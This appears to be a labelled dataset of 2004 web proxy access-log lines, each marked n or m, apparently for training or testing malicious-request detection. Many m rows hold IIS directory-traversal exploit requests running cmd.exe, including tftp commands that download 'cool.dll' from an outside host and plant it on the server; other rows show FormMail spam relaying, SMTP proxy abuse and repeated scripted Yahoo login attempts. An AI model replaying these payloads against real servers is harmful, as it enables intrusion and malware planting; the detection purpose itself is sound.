rowIndex, row, class
1819, 212.160.136.163 - - [10/Mar/2004:03:05:55 -0500] "GET http://www.webger.com/s/webger.php?username=zbrown&keywords=auto%20loans HTTP/1.0" 200 30284 "http://www.power.lifting.ifbbpro.net/" "Mozilla/4.0 (compatible; MSIE 4.01; Windows NT)", n
1820, 68.48.142.117 - - [10/Mar/2004:03:06:06 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
1821, 203.121.182.141 - - [10/Mar/2004:03:06:25 -0500] "CONNECT 194.78.22.186:25 HTTP/1.0" 500 434 "-" "-", n
1822, 67.83.151.132 - - [10/Mar/2004:03:06:26 -0500] "POST http://www.datasync.com/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1823, 67.83.151.132 - - [10/Mar/2004:03:06:26 -0500] "POST http://experiencethailand.netfirms.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1824, 65.66.156.226 - - [10/Mar/2004:03:06:28 -0500] "GET http://sbc1.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_i_j_&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1825, 68.48.142.117 - - [10/Mar/2004:03:06:30 -0500] "GET /_vti_bin/..%255c../..%255c../..%255c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1826, 67.83.151.132 - - [10/Mar/2004:03:06:34 -0500] "POST http://www.coloradodirectory.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1827, 212.160.136.163 - - [10/Mar/2004:03:06:37 -0500] "GET http://www.yoomy.com/Search1.php?ID=153&Q=personal+finances&B3=Search HTTP/1.0" 200 14632 "http://www.power.lift.ifbbpro.net/" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 95)", n
1828, 212.160.136.163 - - [10/Mar/2004:03:06:40 -0500] "GET http://www.yoomy.com/Go.php?Record=5486626&yo=5902a23e9c22ba07b0fdec66a531312c HTTP/1.0" 302 0 "http://www.yoomy.com/Search1.php?ID=153&Q=personal+finances&B3=Search" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 95)", n
1829, 212.160.136.163 - - [10/Mar/2004:03:06:41 -0500] "GET http://feed.genieknows.com/search/xml/Monitor?enc=wo%24y%25uMx%25%25%21J%3F%3F%28%28%28%3E%7C++%7B%24%7Dq%23%25%3Es+%7D%3F+w%3F%21%23M%60%24%23K%23+MCK%23sMDK%7CqMACHABK%7C%7DMAECIAK%7CyMA%40%40%40GCEGDKutMB%40%40D%40B%40CKyyMH%40rH%3EDAEv%3ED%40DussHE%3EvFK%21%7EMK%25+MK%25sMDK%21+MCK%21sMDK%21yM%7C%2BzK%25%24M-x%25%25%21J%3F%3F%28%28%28%3Eq%25sq%24x%3Es+%3E%26%7B%3F6worytM%40%3E%40H6s+ro%27q%7CM%40%3E%40CAIIIIIIBHDGDDBFD6wo%22%23*M%21u%23%24+%7Eq%7C%3Bvy%7Eq%7Esu%246woqvvytMBD6woy%21MFH%3EDH%3EA%40F%3EA%40I6wosqsxuM%5E6wos%7CytMi__%5DioBGBD%01 HTTP/1.0" 200 566 "http://www.yoomy.com/Search1.php?ID=153&Q=personal+finances&B3=Search" "Mozilla/4.0 (compatible; MSIE 5.5; Windows 95)", m
1830, 67.83.151.132 - - [10/Mar/2004:03:06:41 -0500] "POST http://www.yellowknifedogderby.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1831, 68.100.92.214 - - [10/Mar/2004:03:06:43 -0500] "HEAD http://www.sun.com/ HTTP/1.0" 200 0 "-" "Mozilla/4.0 (compatible; ICS)", n
1832, 68.100.92.214 - - [10/Mar/2004:03:06:43 -0500] "HEAD http://www.sun.com/ HTTP/1.0" 200 0 "-" "Mozilla/4.0 (compatible; ICS)", n
1833, 68.48.142.117 - - [10/Mar/2004:03:06:57 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1834, 67.83.151.132 - - [10/Mar/2004:03:06:57 -0500] "POST http://www5.ocn.ne.jp/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1835, 68.217.135.185 - - [10/Mar/2004:03:07:00 -0500] "GET http://<span class=\"result\">68.217.135.185/members/sex/fuck/id000013id/lund268lundxxx.html HTTP/1.0" 400 373 "-" "-", m
1836, 61.237.215.17 - - [10/Mar/2004:03:07:01 -0500] "POST http://www.honey-search.com/cgi-bin/smartsearch/smartsearch.cgi HTTP/1.0" 302 307 "http://www.linkou.con.cn" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)", n
1837, 61.237.215.17 - - [10/Mar/2004:03:07:02 -0500] "GET http://www.honey-search.com/cgi-bin/smartsearch/search.cgi?keywords=Home-Based&username=gu0000 HTTP/1.0" 200 71 "http://www.linkou.con.cn" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)", n
1838, 192.117.242.67 - - [10/Mar/2004:03:07:14 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1839, 192.117.242.67 - - [10/Mar/2004:03:07:19 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1840, 68.48.142.117 - - [10/Mar/2004:03:07:20 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
1841, 203.121.182.188 - - [10/Mar/2004:03:07:21 -0500] "CONNECT 209.15.20.162:25 HTTP/1.0" 200 - "-" "-", n
1842, 67.125.136.193 - - [10/Mar/2004:03:07:21 -0500] "GET http://www.tnvgirls.com/members/ HTTP/1.0" 200 566 "http://www.tnvgirls.com/members/" "Mozilla/4.0 ( compatible; MSIE 4.01; Windows XP; DigiExt )", n
1843, 65.66.156.226 - - [10/Mar/2004:03:07:26 -0500] "GET http://sbc1.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_fi_fi_&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1844, 212.160.136.163 - - [10/Mar/2004:03:07:39 -0500] "GET http://versearch.com/search.php?ID=1334&fString=webmasters HTTP/1.0" 302 0 "http://www.gemini.dog.rottweilers.homerescue.org/" "Mozilla/4.0 (compatible; MSIE 4.0; Windows 98)", n
1845, 212.160.136.163 - - [10/Mar/2004:03:07:41 -0500] "GET http://versearch.com/search_results.php?fSearch_id=e74b820e97909334&fString=webmasters HTTP/1.0" 200 15620 "http://www.gemini.dog.rottweilers.homerescue.org/" "Mozilla/4.0 (compatible; MSIE 4.0; Windows 98)", n
1846, 67.83.151.132 - - [10/Mar/2004:03:07:44 -0500] "POST http://www.primarymonitor.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1847, 212.160.136.163 - - [10/Mar/2004:03:07:44 -0500] "GET http://versearch.com/redirect.php?fID=78675456 HTTP/1.0" 302 0 "http://versearch.com/search_results.php?fSearch_id=e74b820e97909334&fString=webmasters" "Mozilla/4.0 (compatible; MSIE 4.0; Windows 98)", n
1848, 68.48.142.117 - - [10/Mar/2004:03:07:47 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1849, 212.160.136.163 - - [10/Mar/2004:03:07:49 -0500] "GET http://www.blowsearch.com/r.php?mc=fergfnzorjCCC3280417044GGGwebmastersPPP2QQQ23PPP3290121860PPP80QQQ60QQQ328QQQ321BBB3280417044BBB3290128260PPP80QQQ60QQQ328QQQ321PPPblowsearch=xpwAAAxpw=QV?vtpsDDDe/upenrf/ynpbyOOOvtp/zbpDDDxpvhdOOOgvqavsDDDjjj//CCCcgguCCCCCCMMM112CCCCCC711DDD1CCCCCCfergfnzorjCCCCCC9517109812OOO4723218308OOO122DDD45DDD18DDD77CCCCCC9570109812CCCCCC012DDD712DDD95DDD97CCCCCCravnyeriCCCCCC]xpvhDgVqavS[CCCCCC4723218308&v=c39c0de4e20b901bdd863fe778320e5f HTTP/1.0" 302 2 "http://versearch.com/search_results.php?fSearch_id=e74b820e97909334&fString=webmasters" "Mozilla/4.0 (compatible; MSIE 4.0; Windows 98)", m
1850, 212.160.136.163 - - [10/Mar/2004:03:07:50 -0500] "GET http://www.findit-quick.com/cgi-local/search/r.fcgi?ID=jck&jck=upenrfjbyoCCC012DDD712DDD95DDD97CCC9517109812OOO3396039712OOO012DDD712DDD95DDD97CCC9570109812CCC21DDD1CCCfergfnzorjTTT3396039712:webmasters HTTP/1.0" 302 283 "http://versearch.com/search_results.php?fSearch_id=e74b820e97909334&fString=webmasters" "Mozilla/4.0 (compatible; MSIE 4.0; Windows 98)", n
1851, 212.160.136.163 - - [10/Mar/2004:03:07:51 -0500] "GET http://banners.no1free.com/ HTTP/1.0" 200 2063 "http://versearch.com/search_results.php?fSearch_id=e74b820e97909334&fString=webmasters" "Mozilla/4.0 (compatible; MSIE 4.0; Windows 98)", n
1852, 67.83.151.132 - - [10/Mar/2004:03:08:01 -0500] "POST http://www.mainerec.com/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", 
1853, 68.48.142.117 - - [10/Mar/2004:03:08:12 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1854, 67.83.151.132 - - [10/Mar/2004:03:08:15 -0500] "POST http://www.maa.agleia.de/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1855, 65.66.156.226 - - [10/Mar/2004:03:08:24 -0500] "GET http://sbc2.login.scd.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_hez_&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1856, 67.83.151.132 - - [10/Mar/2004:03:08:32 -0500] "POST http://www.scmwa.com/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1857, 68.48.142.117 - - [10/Mar/2004:03:08:37 -0500] "GET /scripts/..%252f../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1858, 67.83.151.132 - - [10/Mar/2004:03:08:45 -0500] "POST http://www.openoceansurfing.com/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1859, 67.83.151.132 - - [10/Mar/2004:03:08:52 -0500] "POST http://www.saunalahti.fi/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1860, 61.237.215.17 - - [10/Mar/2004:03:08:58 -0500] "POST http://rankstar.com/search.php HTTP/1.0" 200 27943 "http://www.linkou.con.cn" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)", n
1861, 61.237.215.17 - - [10/Mar/2004:03:09:01 -0500] "GET http://rankstar.com/go.php?bx=hdzzhihd&b=hxzczdhdzzzmzp&k=skaassszadsxsd&u=sdaiakahaiss&l=hczczchkfhdddzdmfsfzhfzdhczdhdznzzhvhazszydffffohizohnhdhpzzhdzhzmzfzszchpzfzyfsffzdzmzvsdzzzvzyfoaodfsmszfsfoapdhfndpsidmsczxdaadhosaavscsmaifpfydiapsodfasdmavaodzdhsndfzxaoznaofodhdmfssohyskfnsifmfpanfcdhschddydhsasiaafzahzhhizfaydmhsfosdfkdphxafdkayhmfkfzsyhyhidxffhhfhfsddzhansssnadsysssozyfxhfhazkzahphfzvfzdazmadskszzcspaasxszsiahsisoanzoahszsihvadskszzxanacsfzozxhxzmsaansxapssshhpaospsfaaafhmhohvaxsfaosa&tw=hhzhzxhszahizfzdhnhd&s=hazczdacszssazscfk&t= HTTP/1.0" 302 0 "http://rankstar.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)", m
1862, 68.48.142.117 - - [10/Mar/2004:03:09:02 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1863, 221.7.192.11 - - [10/Mar/2004:03:09:04 -0500] "GET http://ccbbs.cn/index.asp HTTP/1.1" 200 15631 "http://ccbbs.cn/index.asp" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)", n
1864, 61.237.215.17 - - [10/Mar/2004:03:09:09 -0500] "GET http://rankstar.com/go.php?u=sdaiakahaiss&l=hczczchkfhdddzdmfsfzhfzdhczdhdznzzhvhazszydffffohizohnhdhpzzhdzhzmzfzszchpzfzyfsffzdzmzvsdzzzvzyfoaodfsmszfsfoapdhfndpsidmsczxdaadhosaavscsmaifpfydiapsodfasdmavaodzdhsndfzxaoznaofodhdmfssohyskfnsifmfpanfcdhschddydhsasiaafzahzhhizfaydmhsfosdfkdphxafdkayhmfkfzsyhyhidxffhhfhfsddzhansssnadsysssozyfxhfhazkzahphfzvfzdazmadskszzcspaasxszsiahsisoanzoahszsihvadskszzxanacsfzozxhxzmsaansxapssshhpaospsfaaafhmhohvaxsfaosa&k=skaassszadsxsd&b=hxzczdhdzzzmzp&s=hazczdacszssazscfk&x=&t=&tw=hhzhzxhszahizfzdhnhd&bx=hdzzhihd&f=b936b4fef0f57f9c7ef29eb2c811f7ab HTTP/1.0" 302 0 "http://rankstar.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)", n
1865, 61.237.215.17 - - [10/Mar/2004:03:09:11 -0500] "GET http://rankstar.com/jump.php?l=hczczchkfhdddzdmfsfzhfzdhczdhdznzzhvhazszydffffohizohnhdhpzzhdzhzmzfzszchpzfzyfsffzdzmzvsdzzzvzyfoaodfsmszfsfoapdhfndpsidmsczxdaadhosaavscsmaifpfydiapsodfasdmavaodzdhsndfzxaoznaofodhdmfssohyskfnsifmfpanfcdhschddydhsasiaafzahzhhizfaydmhsfosdfkdphxafdkayhmfkfzsyhyhidxffhhfhfsddzhansssnadsysssozyfxhfhazkzahphfzvfzdazmadskszzcspaasxszsiahsisoanzoahszsihvadskszzxanacsfzozxhxzmsaansxapssshhpaospsfaaafhmhohvaxsfaosa HTTP/1.0" 200 940 "http://rankstar.com/search.php" "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)", m
1866, 221.7.192.11 - - [10/Mar/2004:03:09:15 -0500] "GET http://www.ccbbs.cn/ HTTP/1.1" 200 15631 "http://www.ccbbs.cn" "Mozilla/4.0 (compatible; MSIE 4.0; Windows 95)", n
1867, 65.66.156.226 - - [10/Mar/2004:03:09:22 -0500] "GET http://sbc2.login.dcn.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_iln_&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1868, 12.221.212.151 - - [10/Mar/2004:03:09:25 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.7 ( compatible; [dk]; Windows NT5.0; Compaq )", n
1869, 12.221.212.151 - - [10/Mar/2004:03:09:25 -0500] "HEAD http://www.sapphicerotica.com/members/index.html HTTP/1.0" 200 0 "http://www.sapphicerotica.com/members/index.html" "Mozilla/4.73 ( compatible; MSIE 5.5; Windows 98; athome0107 )", n
1870, 68.48.142.117 - - [10/Mar/2004:03:09:27 -0500] "GET /scripts/..%252f../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1871, 68.48.142.117 - - [10/Mar/2004:03:09:52 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1872, 67.83.151.132 - - [10/Mar/2004:03:09:56 -0500] "POST http://www.centralslate.omnia.co.uk/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1873, 192.117.242.67 - - [10/Mar/2004:03:09:58 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1874, 67.83.151.132 - - [10/Mar/2004:03:10:01 -0500] "POST http://www.gtwn.net/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1875, 67.83.151.132 - - [10/Mar/2004:03:10:05 -0500] "POST http://www.inet.hr/cgi-bin/FormMail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1876, 65.66.156.226 - - [10/Mar/2004:03:10:21 -0500] "GET http://edit.europe.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_i_d_&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1877, 68.48.142.117 - - [10/Mar/2004:03:10:42 -0500] "GET /_mem_bin/..%255c../..%255c../..%255c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1878, 68.48.142.117 - - [10/Mar/2004:03:10:43 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
1879, 68.48.142.117 - - [10/Mar/2004:03:10:43 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1880, 68.48.142.117 - - [10/Mar/2004:03:10:43 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1881, 68.48.142.117 - - [10/Mar/2004:03:10:43 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1882, 68.48.142.117 - - [10/Mar/2004:03:10:43 -0500] "GET /msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1883, 68.48.142.117 - - [10/Mar/2004:03:10:43 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
1884, 68.48.142.117 - - [10/Mar/2004:03:10:43 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1885, 68.48.142.117 - - [10/Mar/2004:03:10:43 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1886, 68.48.142.117 - - [10/Mar/2004:03:10:46 -0500] "GET /scripts/..%c1%1c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1887, 68.48.142.117 - - [10/Mar/2004:03:10:49 -0500] "GET /scripts/..%c1%1c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1888, 68.48.142.117 - - [10/Mar/2004:03:10:49 -0500] "GET /scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 404 305 "-" "-", m
1889, 68.48.142.117 - - [10/Mar/2004:03:10:52 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
1890, 68.48.142.117 - - [10/Mar/2004:03:10:52 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1891, 68.48.142.117 - - [10/Mar/2004:03:10:55 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1892, 68.48.142.117 - - [10/Mar/2004:03:10:58 -0500] "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1893, 68.48.142.117 - - [10/Mar/2004:03:10:58 -0500] "GET /scripts/..%c0%af../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1894, 68.48.142.117 - - [10/Mar/2004:03:10:58 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
1895, 68.48.142.117 - - [10/Mar/2004:03:10:58 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20c:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1896, 68.48.142.117 - - [10/Mar/2004:03:10:58 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20d:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1897, 68.48.142.117 - - [10/Mar/2004:03:10:58 -0500] "GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+tftp%20-i%2068.48.142.117%20GET%20cool.dll%20e:\\httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1898, 68.48.142.117 - - [10/Mar/2004:03:10:58 -0500] "GET /scripts/..%c1%9c../httpodbc.dll HTTP/1.0" 200 566 "-" "-", m
1899, 68.48.142.117 - - [10/Mar/2004:03:10:58 -0500] "GET /scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 400 289 "-" "-", m
1900, 68.48.142.117 - - [10/Mar/2004:03:10:58 -0500] "GET /scripts/..%%35c../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 400 289 "-" "-", m
1901, 61.237.215.17 - - [10/Mar/2004:03:10:59 -0500] "GET http://hellynet.com/search.php?ID=1093&fString=Picture+Frames HTTP/1.0" 302 0 "http://www.yanshi.cc/ys01/ys0100006/index-3-7.htm" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)", n
1902, 61.237.215.17 - - [10/Mar/2004:03:11:01 -0500] "GET http://hellynet.com/search_results.php?fSearch_id=d3b45a12ad1f1b00&fString=picture+frames HTTP/1.0" 200 14079 "http://www.yanshi.cc/ys01/ys0100006/index-3-7.htm" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)", n
1903, 67.83.151.132 - - [10/Mar/2004:03:11:02 -0500] "POST http://www.glasriket.se/cgi-bin/formmail.pl HTTP/1.1" 200 578 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98; AIRF; .NET CLR 1.0.3705)", n
1904, 61.237.215.17 - - [10/Mar/2004:03:11:04 -0500] "GET http://hellynet.com/redirect.php?fID=36291080 HTTP/1.0" 302 0 "http://hellynet.com/search_results.php?fSearch_id=d3b45a12ad1f1b00&fString=picture+frames" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)", n
1905, 61.237.215.17 - - [10/Mar/2004:03:11:05 -0500] "GET http://rd6.galaxysearch.com/js?clickId=QocgEOM9OLR HTTP/1.0" 200 770 "http://hellynet.com/search_results.php?fSearch_id=d3b45a12ad1f1b00&fString=picture+frames" "Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)", n
1906, 61.53.76.40 - - [10/Mar/2004:03:11:12 -0500] "POST http://69.59.175.60/found-best.com/search.php HTTP/1.0" 502 556 "http://www.aprilgoldsgetpaid2reademail.com/pages/ptc.php" "Mozilla/4.78 [ja] (Win98; U)", n
1907, 65.66.156.226 - - [10/Mar/2004:03:11:20 -0500] "GET http://login.india.yahoo.com/config/login?.redir_from=PROFILES?&.tries=1&.src=jpg&.last=&promo=&.intl=us&.bypass=&.partner=&.chkP=Y&.done=http://jpager.yahoo.com/jpager/pager2.shtml&login=_iln_&passwd=cheater HTTP/1.0" 200 566 "-" "-", n
1908, 213.196.208.80 - - [10/Mar/2004:03:11:26 -0500] "GET http://www.glocksoft.net/cgi-bin/jenv.cgi HTTP/1.0" 200 1169 "-" "Mozilla/4.0", n
1909, 213.196.208.80 - - [10/Mar/2004:03:11:27 -0500] "CONNECT ftp.angelfire.com:21 HTTP/1.0" 403 291 "-" "Mozilla/4.0", n
1910, 213.196.208.80 - - [10/Mar/2004:03:11:30 -0500] "CONNECT www.somebody.net:443 HTTP/1.0" 200 - "-" "Advanced Administrative Tools", n
1911, 68.48.142.117 - - [10/Mar/2004:03:11:49 -0500] "GET /scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir HTTP/1.0" 200 566 "-" "-", m
1912, 192.117.242.67 - - [10/Mar/2004:03:12:02 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
1913, 212.160.136.163 - - [10/Mar/2004:03:12:03 -0500] "GET http://www.searcheaven.net/cgi-bin/smartsearch/smartsearch.cgi?username=bmocking&keywords=mortgage HTTP/1.0" 200 36843 "http://www.gemini.dogs.homerescue.org/" "Mozilla/4.0 (compatible; MSIE 5.02; Windows 98)", n
1914, 203.121.182.141 - - [10/Mar/2004:03:12:06 -0500] "CONNECT 194.206.161.150:25 HTTP/1.0" 200 - "-" "-", n
1915, 192.117.242.67 - - [10/Mar/2004:03:12:07 -0500] "CONNECT login.icq.com:443 HTTP/1.0" 200 - "-" "-", n
